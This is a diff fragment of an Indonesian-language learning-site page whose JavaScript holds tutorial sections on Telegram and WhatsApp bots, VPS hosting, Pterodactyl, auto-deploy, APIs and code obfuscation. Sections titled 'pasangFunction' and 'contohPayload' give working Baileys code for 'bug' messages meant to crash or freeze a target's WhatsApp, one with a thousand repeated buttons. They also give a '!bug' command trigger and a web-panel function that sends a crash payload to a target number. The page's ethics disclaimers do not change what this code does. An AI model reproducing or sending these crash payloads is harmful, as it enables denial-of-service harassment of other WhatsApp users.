+npm install telegraf</code></pre>
+
+    <h4>📜 2. Buat File <code>index.js</code></h4>
+    <pre><code>
+const { Telegraf } = require('telegraf');
+const bot = new Telegraf('TOKEN_BOT_TELEGRAM');
+
+bot.start((ctx) => ctx.reply('Halo! Selamat datang di bot Telegram.'));
+bot.help((ctx) => ctx.reply('Kirim command /start untuk memulai.'));
+
+bot.command('ping', (ctx) => ctx.reply('Pong!'));
+
+bot.on('text', (ctx) => {
+  ctx.reply('Kamu mengirim: ' + ctx.message.text);
+});
+
+bot.launch();
+
+console.log('Bot Telegram berjalan...');
+    </code></pre>
+
+    <h4>📦 3. Jalankan Bot</h4>
+    <p>Jalankan perintah <code>node index.js</code> di terminal VPS kamu.</p>
+
+    <h4>🎯 4. Tes Bot</h4>
+    <p>Cari bot kamu di Telegram (menggunakan username yang sudah didaftarkan bot), kirim /start atau /ping, dan lihat balasannya.</p>
+
+    <h4>⚠️ Catatan</h4>
+    <ul>
+      <li>Pastikan TOKEN_BOT_TELEGRAM diganti dengan token asli dari BotFather.</li>
+      <li>Gunakan webhook jika ingin deploy bot di server production.</li>
+    </ul>
+
+    <h4>✅ Selesai</h4>
+    <p>Kamu sudah berhasil membuat bot Telegram sederhana menggunakan Telegraf.</p>
+  `,
+        pasangFunction: `
+    <h4>🧩 Apa itu Function Bug?</h4>
+    <p>Function bug adalah fungsi yang dibuat di bot untuk mengirim pesan khusus yang bisa bikin aplikasi WhatsApp atau Telegram target crash, lag, atau force close. Payload biasanya berisi struktur pesan JSON yang sengaja rusak atau aneh agar client gagal parsing.</p>
+
+    <h4>📂 Struktur Folder</h4>
+    <pre><code>
+/project/
+├── index.js
+├── functions/
+│   └── functionBug.js
+├── session/
+├── package.json
+    </code></pre>
+
+    <h4>🛠️ Contoh Function Bug (<code>functionBug.js</code>)</h4>
+    <pre><code>async function kirimFunctionBug(jid, sock) {
+  const bugPayload = {
+    viewOnceMessage: {
+      message: {
+        templateMessage: {
+          hydratedTemplate: {
+            hydratedContentText: '*⚠️ CRASH PAYLOAD TEST*',
+            hydratedButtons: [
+              {
+                quickReplyButton: {
+                  displayText: '💥 BUG!',
+                  id: 'bug_exploit'
+                }
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+  await sock.sendMessage(jid, bugPayload);
+}
+module.exports = kirimFunctionBug;
+    </code></pre>
+
+    <h4>🔗 Cara Pakai di <code>index.js</code></h4>
+    <pre><code>const kirimFunctionBug = require('./functions/functionBug');
+
+sock.ev.on('messages.upsert', async ({ messages }) => {
+  const msg = messages[0];
+  if (!msg.message) return;
+  const from = msg.key.remoteJid;
+  const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
+
+  if (text === '!bug') {
+    try {
+      await kirimFunctionBug(from, sock);
+      await sock.sendMessage(from, { text: 'Function bug berhasil dikirim!' });
+    } catch (e) {
+      console.error('Error kirim bug:', e);
+    }
+  }
+});
+    </code></pre>
+
+    <h4>⚠️ Peringatan dan Etika</h4>
+    <ul>
+      <li>Jangan gunakan untuk menjahili orang lain.</li>
+      <li>Gunakan hanya untuk testing, edukasi, atau debugging.</li>
+      <li>WhatsApp bisa update sistem dan bug bisa tidak bekerja lagi.</li>
+      <li>Gunakan payload dengan hati-hati agar bot tidak banned.</li>
+    </ul>
+  `,
+        handler: `
+    <h4>📚 Apa itu Command Handler?</h4>
+    <p>Command handler adalah sistem untuk mengelola dan mengeksekusi perintah (commands) yang dikirim pengguna ke bot. Dengan handler, kamu bisa pisah-pisah fungsi command jadi file atau modul berbeda agar rapi dan mudah dikembangkan.</p>
+
+    <h4>📂 Struktur Project dengan Command Handler</h4>
+    <pre><code>
+/project/
+├── commands/
+│   ├── ping.js
+│   └── help.js
+├── index.js
+├── package.json
+    </code></pre>
+
+    <h4>🛠️ Contoh File Command (ping.js)</h4>
+    <pre><code>module.exports = {
+  name: 'ping',
+  description: 'Menjawab pong sebagai balasan',
+  execute: async (msg, sock) => {
+    await sock.sendMessage(msg.key.remoteJid, { text: '🏓 Pong!' });
+  }
+};
+    </code></pre>
+
+    <h4>🧩 Contoh Implementasi Command Handler di <code>index.js</code></h4>
+    <pre><code>const fs = require('fs');
+const path = require('path');
+
+const commands = new Map();
+const commandsPath = path.join(__dirname, 'commands');
+const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
+
+for (const file of commandFiles) {
+  const command = require(path.join(commandsPath, file));
+  commands.set(command.name, command);
+}
+
+// Event pesan masuk
+sock.ev.on('messages.upsert', async ({ messages }) => {
+  const msg = messages[0];
+  if (!msg.message) return;
+
+  const from = msg.key.remoteJid;
+  const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
+  if (!text) return;
+
+  if (!text.startsWith('!')) return; // prefix "!"
+
+  const args = text.slice(1).trim().split(/ +/);
+  const commandName = args.shift().toLowerCase();
+
+  if (!commands.has(commandName)) return;
+
+  try {
+    await commands.get(commandName).execute(msg, sock);
+  } catch (error) {
+    console.error('Error executing command:', error);
+    await sock.sendMessage(from, { text: '⚠️ Error menjalankan command.' });
+  }
+});
+    </code></pre>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Dengan command handler, kamu bisa pisah fungsi command jadi file modular dan bot jadi lebih terstruktur, mudah dikembangkan, dan lebih mudah debug.</p>
+  `,
+        proteksi: `
+    <h4>🔒 Mengapa Script Perlu Dilindungi?</h4>
+    <p>Script yang kamu buat bisa saja dicuri, dibajak, atau di-crack oleh pihak lain. Oleh karena itu, penting untuk melindungi script agar tidak mudah dibajak, terutama jika kamu menjual atau mendistribusikan script tersebut.</p>
+
+    <h4>📌 Teknik Proteksi Umum</h4>
+    <ul>
+      <li><b>Obfuscation:</b> Mengacak kode sumber sehingga sulit dibaca dan dimengerti.</li>
+      <li><b>Minification:</b> Memperkecil ukuran kode dengan menghapus spasi, komentar, dan mengganti nama variabel jadi pendek.</li>
+      <li><b>Enkripsi File:</b> Menggunakan enkripsi pada file script dan mendekripsi secara runtime.</li>
+      <li><b>License Key:</b> Membuat mekanisme validasi lisensi untuk membatasi penggunaan.</li>
+      <li><b>Anti Debugging:</b> Menambahkan pengecekan agar script sulit di-debug dan di-trace.</li>
+    </ul>
+
+    <h4>🔧 Contoh Obfuscation Sederhana dengan javascript-obfuscator</h4>
+    <pre><code>npm install -g javascript-obfuscator
+
+// Jalankan di terminal
+javascript-obfuscator index.js --output index-obf.js --compact true --control-flow-flattening true
+    </code></pre>
+
+    <h4>⚠️ Catatan</h4>
+    <p>Proteksi tidak 100% aman, tapi bisa memperlambat pembajakan dan membuatnya sulit dimengerti.</p>
+
+    <h4>💡 Tips Tambahan</h4>
+    <ul>
+      <li>Jangan simpan kunci lisensi secara hardcode dalam script.</li>
+      <li>Update proteksi secara berkala mengikuti tren hacking terbaru.</li>
+      <li>Gunakan server untuk validasi lisensi agar lebih aman.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Melindungi script sangat penting untuk menjaga hak cipta dan keamanan aplikasi kamu. Gunakan obfuscation, enkripsi, dan license key sebagai langkah utama.</p>
+  `,
+        hosting: `
+    <h4>🚀 Apa Itu VPS?</h4>
+    <p>VPS (Virtual Private Server) adalah server virtual yang bisa kamu gunakan untuk menjalankan aplikasi, seperti bot WhatsApp, website, atau server game. VPS memberikan kontrol penuh layaknya server fisik, tapi dengan harga lebih terjangkau.</p>
+
+    <h4>📌 Kenapa Harus Hosting di VPS?</h4>
+    <ul>
+      <li>Server 24/7, bot atau website kamu online terus tanpa gangguan.</li>
+      <li>Kontrol penuh atas sistem operasi dan konfigurasi.</li>
+      <li>Bisa install software apa saja sesuai kebutuhan.</li>
+      <li>Skalabilitas lebih baik daripada shared hosting biasa.</li>
+    </ul>
+
+    <h4>🔧 Langkah-Langkah Hosting Bot di VPS</h4>
+    <ol>
+      <li><b>Beli VPS:</b> Pilih penyedia VPS seperti DigitalOcean, Vultr, Linode, atau provider lokal.</li>
+      <li><b>Login ke VPS:</b> Gunakan SSH dari terminal atau aplikasi seperti Termius. Contoh:
+      <pre><code>ssh root@IP_VPS_KAMU</code></pre></li>
+      <li><b>Update dan install Node.js:</b>
+      <pre><code>sudo apt update
+sudo apt install nodejs npm -y
+node -v
+npm -v</code></pre></li>
+      <li><b>Upload script bot ke VPS:</b> Pakai scp atau aplikasi SFTP seperti FileZilla atau WinSCP.</li>
+      <li><b>Jalankan bot:</b>
+      <pre><code>cd /path/script-bot
+npm install
+node index.js</code></pre></li>
+      <li><b>Gunakan Process Manager:</b> Supaya bot tetap berjalan walau SSH terputus, pakai PM2:
+      <pre><code>npm install -g pm2
+pm2 start index.js
+pm2 save
+pm2 startup</code></pre></li>
+      <li><b>Pantau dan restart otomatis:</b> PM2 bisa restart bot kalau error atau server restart.</li>
+    </ol>
+
+    <h4>💡 Tips</h4>
+    <ul>
+      <li>Gunakan firewall (ufw) untuk amankan VPS.</li>
+      <li>Backup script dan data secara rutin.</li>
+      <li>Update sistem dan Node.js secara berkala.</li>
+      <li>Gunakan domain dan SSL kalau buat website.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Hosting di VPS memberikan kebebasan dan kestabilan untuk jalankan bot atau aplikasi kamu. Dengan pengaturan yang tepat, VPS bisa jadi “rumah” bot kamu yang selalu online dan siap bekerja.</p>
+  `,
+        pterodactyl: `
+    <h4>📌 Apa itu Pterodactyl?</h4>
+    <p>Pterodactyl adalah panel kontrol open-source untuk mengelola server game dan aplikasi, termasuk bot. Panel ini memudahkan kamu mengelola VPS atau dedicated server lewat antarmuka web.</p>
+
+    <h4>🛠️ Fitur Utama</h4>
+    <ul>
+      <li>Manajemen server melalui UI web yang user-friendly.</li>
+      <li>Mendukung Docker container untuk isolasi aplikasi.</li>
+      <li>Pengaturan resource server (CPU, RAM, Storage).</li>
+      <li>Manajemen pengguna dan izin akses.</li>
+      <li>API untuk integrasi dengan sistem lain.</li>
+    </ul>
+
+    <h4>📋 Struktur Instalasi</h4>
+    <pre><code>
+/var/lib/pterodactyl/
+├── wings/      # daemon untuk menjalankan server
+├── panel/      # aplikasi web panel
+└── backups/    # cadangan server
+    </code></pre>
+
+    <h4>⚙️ Cara Install Singkat</h4>
+    <ol>
+      <li>Siapkan VPS Ubuntu 20.04 atau 22.04.</li>
+      <li>Update sistem: <code>sudo apt update && sudo apt upgrade -y</code></li>
+      <li>Install dependencies seperti Docker, Node.js, PHP, MySQL, Nginx.</li>
+      <li>Download dan konfigurasi Pterodactyl panel dan daemon wings.</li>
+      <li>Jalankan migrasi database dan setup webserver.</li>
+      <li>Login ke panel lewat browser dan buat server baru.</li>
+    </ol>
+
+    <h4>🔗 Link Resmi</h4>
+    <p><a href="https://pterodactyl.io" target="_blank" style="color:#00ccff;">https://pterodactyl.io</a></p>
+
+    <h4>💡 Tips</h4>
+    <ul>
+      <li>Selalu backup data server sebelum update.</li>
+      <liGunakan SSL (https) agar panel aman.</li>
+      <li>Pelajari dokumentasi resmi untuk konfigurasi lanjutan.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Pterodactyl adalah solusi panel manajemen server yang powerful dan fleksibel untuk kebutuhan bot dan game server kamu.</p>
+  `,
+        autodeploy: `
+    <h4>🚀 Apa Itu Auto Deploy Bot?</h4>
+    <p>Auto deploy bot artinya bot kamu akan otomatis update dan restart setiap kali kamu push perubahan ke GitHub. Ini bikin workflow kamu lebih cepat dan efisien, tanpa perlu masuk ke VPS manual.</p>
+
+    <h4>🔧 Apa yang Dibutuhkan?</h4>
+    <ul>
+      <li>GitHub Repository tempat bot kamu disimpan</li>
+      <li>VPS dengan akses root atau user biasa yang punya akses ke folder project</li>
+      <li>Script deploy</li>
+      <li>Server listener (misalnya pakai Express.js)</li>
+    </ul>
+
+    <h4>📁 Struktur Folder</h4>
+    <pre><code>
+/project-bot/
+├── deploy.sh
+├── listener.js
+├── index.js (bot utama)
+└── node_modules/
+    </code></pre>
+
+    <h4>📝 Contoh deploy.sh</h4>
+    <pre><code>
+#!/bin/bash
+cd /home/user/project-bot
+git pull origin main
+pm2 restart index.js
+    </code></pre>
+    <p>Script ini akan menarik update terbaru dari GitHub dan restart bot kamu via PM2.</p>
+
+    <h4>🧠 Listener Webhook (listener.js)</h4>
+    <pre><code>
+const express = require('express');
+const { exec } = require('child_process');
+const app = express();
+
+app.use(express.json());
+
+app.post('/webhook', (req, res) => {
+  console.log('Received webhook from GitHub');
+  exec('sh /home/user/project-bot/deploy.sh', (err, stdout, stderr) => {
+    if (err) {
+      console.error('Deploy failed:', err);
+      return res.status(500).send('Deploy failed');
+    }
+    console.log('Deploy success:', stdout);
+    res.send('Deploy success');
+  });
+});
+
+app.listen(3000, () => console.log('Webhook listener running'));
+    </code></pre>
+
+    <h4>🔗 Setting Webhook di GitHub</h4>
+    <ol>
+      <li>Buka repo kamu di GitHub</li>
+      <li>Masuk ke Settings → Webhooks</li>
+      <li>URL: <code>http://IP_VPS_KAMU:3000/webhook</code></li>
+      <li>Content type: application/json</li>
+      <li>Events: pilih <code>Just the push event</code></li>
+      <li>Click Add Webhook</li>
+    </ol>
+
+    <h4>✅ Selesai</h4>
+    <p>Setiap kamu push ke GitHub, server akan otomatis menerima webhook dan menjalankan <code>deploy.sh</code>. Praktis banget buat dev aktif.</p>
+  `,
+        jsonapi: `
+    <h4>📚 Apa itu JSON?</h4>
+    <p>JSON (JavaScript Object Notation) adalah format data yang paling populer untuk pertukaran data antar aplikasi, karena ringan dan mudah dibaca manusia maupun mesin.</p>
+
+    <h4>🔧 Struktur JSON</h4>
+    <pre><code>
+{
+  "nama": "Dev Zal",
+  "umur": 22,
+  "hobi": ["coding", "musik", "gaming"],
+  "aktif": true
+}
+    </code></pre>
+
+    <h4>🌐 Apa itu API?</h4>
+    <p>API (Application Programming Interface) adalah antarmuka yang memungkinkan aplikasi berkomunikasi satu sama lain. Dalam konteks web, API biasanya berupa endpoint HTTP yang menerima request dan mengembalikan response data (biasanya JSON).</p>
+
+    <h4>⚙️ Contoh API Sederhana dengan Express.js</h4>
+    <pre><code>
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+app.get('/api/hello', (req, res) => {
+  res.json({ message: "Halo dari API Dev Zal!" });
+});
+
+app.post('/api/data', (req, res) => {
+  const data = req.body;
+  console.log('Data diterima:', data);
+  res.json({ status: "success", dataDiterima: data });
+});
+
+app.listen(3000, () => console.log('API berjalan di port 3000'));
+    </code></pre>
+
+    <h4>🔔 Apa itu Webhook?</h4>
+    <p>Webhook adalah mekanisme di mana satu aplikasi mengirim data secara otomatis ke aplikasi lain melalui HTTP POST saat suatu event terjadi. Misalnya, GitHub mengirim notifikasi ke server kamu saat ada push ke repository.</p>
+
+    <h4>📌 Cara Kerja Webhook</h4>
+    <ol>
+      <li>Aplikasi A mengirim data ke URL tertentu saat event terjadi.</li>
+      <li>Aplikasi B menerima data dan memprosesnya.</li>
+      <li>Aplikasi B merespon sesuai kebutuhan.</li>
+    </ol>
+
+    <h4>🔧 Contoh Webhook Listener dengan Express.js</h4>
+    <pre><code>
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+app.post('/webhook', (req, res) => {
+  const payload = req.body;
+  console.log('Webhook diterima:', payload);
+  res.sendStatus(200);
+});
+
+app.listen(3000, () => console.log('Webhook listener berjalan di port 3000'));
+    </code></pre>
+
+    <h4>⚠️ Tips & Best Practices</h4>
+    <ul>
+      <li>Selalu validasi data yang diterima webhook.</li>
+      <li>Gunakan token rahasia untuk verifikasi webhook.</li>
+      <li>Jangan memproses data berat secara langsung, gunakan queue jika perlu.</li>
+      <li>Berikan respon cepat (status 200) agar webhook tidak timeout.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>JSON, API, dan webhook adalah pondasi komunikasi aplikasi modern. Dengan memahami ini, kamu bisa membangun sistem bot yang terintegrasi dan responsif dengan ekosistem lain.</p>
+  `,
+        obfuscate: `
+    <h4>📌 Apa itu Obfuscate?</h4>
+    <p>Obfuscate adalah proses mengubah kode sumber program menjadi bentuk yang sulit dimengerti manusia, tapi tetap bisa dijalankan oleh mesin. Tujuannya untuk melindungi kode dari pembajakan, pembacaan, atau modifikasi ilegal.</p>
+
+    <h4>🎯 Manfaat Obfuscate</h4>
+    <ul>
+      <li>Mengurangi risiko pembajakan dan plagiarisme kode.</li>
+      <li>Menyulitkan reverse engineering dan cracking.</li>
+      <li>Melindungi rahasia algoritma dan logika bisnis.</li>
+    </ul>
+
+    <h4>🛠️ Cara Obfuscate File JavaScript</h4>
+    <ol>
+      <li>Gunakan tools seperti <code>javascript-obfuscator</code> yang populer dan mudah dipakai.</li>
+      <li>Install via npm:</li>
+      <pre><code>npm install -g javascript-obfuscator</code></pre>
+      <li>Obfuscate file:</li>
+      <pre><code>javascript-obfuscator input.js --output output.js</code></pre>
+      <li>Tambahkan opsi seperti <code>--compact true</code> atau <code>--controlFlowFlattening true</code> untuk proteksi lebih kuat.</li>
+    </ol>
+
+    <h4>⚠️ Catatan Penting</h4>
+    <ul>
+      <li>Obfuscate tidak 100% aman, hanya menyulitkan pembaca kode.</li>
+      <li>Pastikan kode sudah diuji setelah obfuscate, karena proses ini bisa menyebabkan error jika ada syntax aneh.</li>
+      <li>Backup kode asli sebelum proses obfuscate.</li>
+    </ul>
+
+    <h4>🔐 Proteksi Tambahan</h4>
+    <p>Selain obfuscate, kamu bisa gunakan teknik proteksi lain:</p>
+    <ul>
+      <li>Minify kode untuk memperkecil ukuran sekaligus mengaburkan kode.</li>
+      <li>Enkripsi bagian tertentu menggunakan runtime decryption.</li>
+      <li>Gunakan license key dan validasi server untuk mengontrol penggunaan.</li>
+    </ul>
+
+    <h4>📦 Integrasi dalam Project</h4>
+    <p>Buat script build di <code>package.json</code> agar proses obfuscate otomatis saat deploy:</p>
+    <pre><code>
+"scripts": {
+  "build": "javascript-obfuscator src/index.js --output dist/index.js --compact true --controlFlowFlattening true"
+}
+    </code></pre>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Obfuscate dan proteksi file penting untuk menjaga keamanan kode, tapi harus dipadukan dengan teknik lain dan pengujian yang baik.</p>
+  `,
+        panelWeb: `
+    <h4>🖥️ Contoh Frontend JavaScript (app.js)</h4>
+    <pre><code>
+async function sendBug() {
+  const target = document.getElementById('target').value.trim();
+  const mode = document.getElementById('mode').value;
+
+  if (!target) {
+    alert('Isi nomor target dulu!');
+    return;
+  }
+
+  const res = await fetch('/api/send-bug', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ target, mode })
+  });
+
+  const data = await res.json();
+  alert(data.message);
+}
+    </code></pre>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Membuat website panel sendiri memberikan kemudahan untuk kontrol sistem secara visual dan terorganisir. Gunakan API untuk komunikasi frontend-backend agar sistem berjalan realtime dan mudah dikembangkan.</p>
+  `,
+        uploadVPS: `
+    <h4>📌 Pengantar</h4>
+    <p>Meng-upload file ke VPS sangat penting agar kamu bisa menjalankan script, mengupdate bot, atau menyimpan data yang dibutuhkan.</p>
+
+    <h4>🛠️ Metode Upload File ke VPS</h4>
+    <ol>
+      <li><strong>SSH dengan SCP (Secure Copy Protocol)</strong><br>
+      Cara mudah untuk transfer file lewat terminal (Linux, macOS, Windows dengan WSL atau Git Bash).</li>
+      <li><strong>FTP / SFTP</strong><br>
+      Menggunakan aplikasi FTP client seperti FileZilla, WinSCP, atau Cyberduck.</li>
+      <li><strong>Panel Hosting (misal Pterodactyl)</strong><br>
+      Banyak panel hosting menyediakan fitur upload langsung via browser.</li>
+    </ol>
+
+    <h4>🔧 Upload File dengan SCP</h4>
+    <p>Contoh perintah untuk upload file dari komputer lokal ke VPS:</p>
+    <pre><code>
+scp /path/ke/file.js user@ip-vps:/home/user/
+    </code></pre>
+    <p>Ganti <code>user</code> dengan username VPS, <code>ip-vps</code> dengan IP VPS kamu, dan sesuaikan path file dan tujuan.</p>
+
+    <h4>📂 Upload File dengan SFTP (FileZilla / WinSCP)</h4>
+    <ol>
+      <li>Buka aplikasi FTP client.</li>
+      <li>Masukkan host: IP VPS kamu, username, password, dan port SSH (biasanya 22).</li>
+      <li>Connect lalu drag & drop file dari lokal ke folder VPS yang diinginkan.</li>
+    </ol>
+
+    <h4>💡 Tips</h4>
+    <ul>
+      <li>Pastikan user VPS punya izin akses ke folder tujuan.</li>
+      <li>Gunakan private key SSH agar login lebih aman tanpa password.</li>
+      <li>Periksa permission file setelah upload, gunakan <code>chmod</code> jika perlu.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Upload file ke VPS adalah skill dasar yang wajib dikuasai developer. Gunakan metode sesuai kenyamanan dan kebutuhan kamu, dan pastikan koneksi SSH kamu aman.</p>
+  `,
+apaItuBug: `<h4>🧠 Pengertian</h4>
+<p><strong>Bug WhatsApp</strong> adalah celah atau kelemahan dalam sistem WhatsApp, baik dari sisi client (pengguna) maupun server (pusat), yang dapat dimanfaatkan untuk menghasilkan perilaku tidak normal, seperti crash, lag, hang, atau bahkan force close aplikasi. Bug ini biasanya ditemukan oleh developer, peretas etis, atau komunitas testing keamanan dan dapat digunakan untuk keperluan riset, edukasi, atau eksploitasi jika disalahgunakan.</p>`,
+  caraKerjaBug: `<h4>🔍 Mekanisme Kerja</h4>
+<p>Cara kerja bug WhatsApp umumnya memanfaatkan kelemahan sistem parsing (pemrosesan data) di aplikasi. WhatsApp mengandalkan struktur data tertentu (seperti JSON) untuk membaca dan menampilkan pesan. Jika data yang dikirimkan tidak sesuai dengan ekspektasi sistem—misalnya terlalu besar, berlapis-lapis, atau mengandung karakter tidak valid—maka akan menyebabkan parsing error, yang akhirnya memicu crash atau freeze pada aplikasi penerima.</p>
+
+<p>Contoh umum teknik ini adalah menggunakan <code>viewOnceMessage</code> yang dibungkus berlapis-lapis atau menanamkan ribuan tombol dalam satu pesan.</p>`,
+  jenisBug: `<h4>📚 Jenis-Jenis Bug WhatsApp</h4>
+<ul>
+  <li><strong>Crash Bug:</strong> Membuat aplikasi langsung tertutup saat membuka chat.</li>
+  <li><strong>Lag Bug:</strong> Membuat aplikasi sangat lambat saat membuka pesan.</li>
+  <li><strong>Freeze Bug:</strong> Layar aplikasi membeku saat memuat pesan atau file tertentu.</li>
+  <li><strong>ViewOnce Bug:</strong> Memaksa media sekali lihat menjadi bisa dilihat berulang kali.</li>
+  <li><strong>Document/Image Bug:</strong> File terlihat biasa namun memiliki struktur yang membebani parser.</li>
+</ul>`,
+  kenapaTerjadi: `<h4>❓ Mengapa Bug Bisa Terjadi?</h4>
+<p>Bug muncul karena adanya ketidaksempurnaan dalam logika pemrograman. WhatsApp, seperti aplikasi lainnya, memiliki batasan dalam hal pemrosesan data. Jika batas tersebut dilampaui atau dimanipulasi secara ekstrem, aplikasi tidak tahu bagaimana harus menangani input tersebut dan akhirnya error.</p>
+
+<p>Hal ini bisa disebabkan oleh:</p>
+<ul>
+  <li>Input data yang terlalu panjang atau kompleks</li>
+  <li>Struktur JSON bertingkat hingga ribuan layer</li>
+  <li>Penggunaan emoji, karakter spesial, atau unicode yang tidak kompatibel</li>
+  <li>Manipulasi field internal dalam pesan</li>
+</ul>`,
+  contohPayload: `<h4>💣 Contoh Payload Berbahaya</h4>
+<pre><code>
+// functionBug.js
+async function kirimBug(jid, sock) {
+  const bugPayload = {
+    viewOnceMessage: {
+      message: {
+        templateMessage: {
+          hydratedTemplate: {
+            hydratedContentText: '*⚠️ CRASH PAYLOAD TEST*',
+            hydratedButtons: new Array(1000).fill({
+              quickReplyButton: {
+                displayText: '💥 BUG!',
+                id: 'bug_exploit'
+              }
+            })
+          }
+        }
+      }
+    }
+  };
+  await sock.sendMessage(jid, bugPayload);
+}
+module.exports = kirimBug;
+</code></pre>
+<p>Payload di atas menggunakan tombol yang diulang hingga ribuan kali untuk menyebabkan beban berat saat WhatsApp mencoba mem-parsing.</p>`,
+  deteksiBug: `<h4>🕵️ Cara Mendeteksi Bug</h4>
+<p>Jika kamu curiga telah menerima bug, berikut gejala yang bisa dikenali:</p>
+<ul>
+  <li>WhatsApp force close saat membuka chat tertentu</li>
+  <li>Layar menjadi putih atau stuck di loading</li>
+  <li>Scrolling menjadi lambat bahkan freeze</li>
+  <li>Tidak bisa membuka media (gambar, dokumen)</li>
+  <li>Pesan berisi banyak emoji, simbol asing, atau karakter panjang</li>
+</ul>`,
+  perlindungan: `<h4>🛡️ Tips Perlindungan dari Bug</h4>
+<ul>
+  <li>Selalu gunakan versi terbaru WhatsApp</li>
+  <li>Jangan buka file/media dari orang asing atau grup tidak dikenal</li>
+  <li>Hapus chat yang mencurigakan lewat WhatsApp Web jika tidak bisa dibuka di HP</li>
+  <li>Gunakan aplikasi WhatsApp clone/MOD dengan fitur anti-crash (opsional)</li>
+  <li>Backup data secara rutin</li>
+</ul>`,
+  etika: `<h4>⚖️ Etika & Tanggung Jawab</h4>
+<p>Bug adalah celah teknis, namun penggunaannya harus penuh tanggung jawab. Menyebarkan atau menyerang pengguna lain dengan bug bisa melanggar hukum, seperti UU ITE di Indonesia. Gunakan pengetahuan ini untuk:</p>
+<ul>
+  <li>Testing keamanan pribadi</li>
+  <li>Riset pengembangan sistem</li>
+  <li>Edukasi dan pelatihan developer</li>
+</ul>
+<p>Jangan gunakan untuk iseng atau merugikan orang lain.</p>`,
+  perbedaanDevice: `<h4>📱 Perbedaan Efek Bug di Tiap Perangkat</h4>
+<ul>
+  <li><strong>Android Low-End:</strong> Rentan terhadap bug besar, mudah force close.</li>
+  <li><strong>Android High-End:</strong> Lebih kuat menahan bug tapi tetap bisa freeze.</li>
+  <li><strong>iPhone:</strong> Biasanya lebih stabil, tapi tetap bisa crash jika payload besar.</li>
+  <li><strong>WhatsApp Web:</strong> Paling tahan, cocok untuk mendeteksi dan menghapus bug.</li>
+</ul>`,
+  efektifitas2025: `<h4>📊 Efektivitas Bug di Tahun 2025</h4>
+<p>Seiring berjalannya waktu, WhatsApp terus memperbarui sistem parsing, keamanan, dan perlindungan terhadap pesan berbahaya. Di tahun 2025, sebagian besar bug klasik sudah tidak efektif lagi. Namun:</p>
+<ul>
+  <li>Bug baru tetap bisa muncul melalui fitur-fitur baru</li>
+  <li>Developer dan hacker etis masih menemukan celah-celah baru</li>
+  <li>Testing dan eksperimen tetap dibutuhkan untuk keamanan</li>
+</ul>`
+};
+      judul.textContent = daftarJudul[id] || "Materi";
+      konten.innerHTML = daftarKonten[id]
+        ? `<p>${daftarKonten[id]}</p>`
+        : `<p>(Penjelasan untuk <strong>${judul.textContent}</strong> belum tersedia.)</p>`;
+    }
+
+    function kembaliDashboard() {
+      document.getElementById("materiPage").style.display = 'none';
+      document.getElementById("dashboard").style.display = 'block';
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const saved = localStorage.getItem("devUser");
+      if (saved) {
+        document.getElementById("loginContainer").style.display = 'none';
+        document.getElementById("dashboard").style.display = 'block';
+        document.getElementById("welcomeMsg").textContent = `Selamat datang, ${saved}!`;
+      }
+    });
   </script>
 </body>
 </html>
